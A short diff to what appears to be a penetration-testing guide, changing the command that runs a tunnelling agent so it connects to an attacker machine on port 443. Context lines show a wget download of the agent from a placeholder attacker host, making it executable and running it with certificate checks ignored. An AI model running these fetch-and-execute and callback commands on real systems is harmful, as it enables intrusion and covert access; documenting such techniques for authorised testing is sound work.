@@ -78,7 +78,7 @@ wget http://<attacker_machine_ip>:8000/agent -P /opt/
 ### Make the Agent executable and run it:
 ```bash
 chmod +x /opt/agent
-/opt/agent -connect <attacker_machine_ip> -ignore-cert
+/opt/agent -connect <attacker_machine_ip>:443 -ignore-cert
 ```
 
 ---
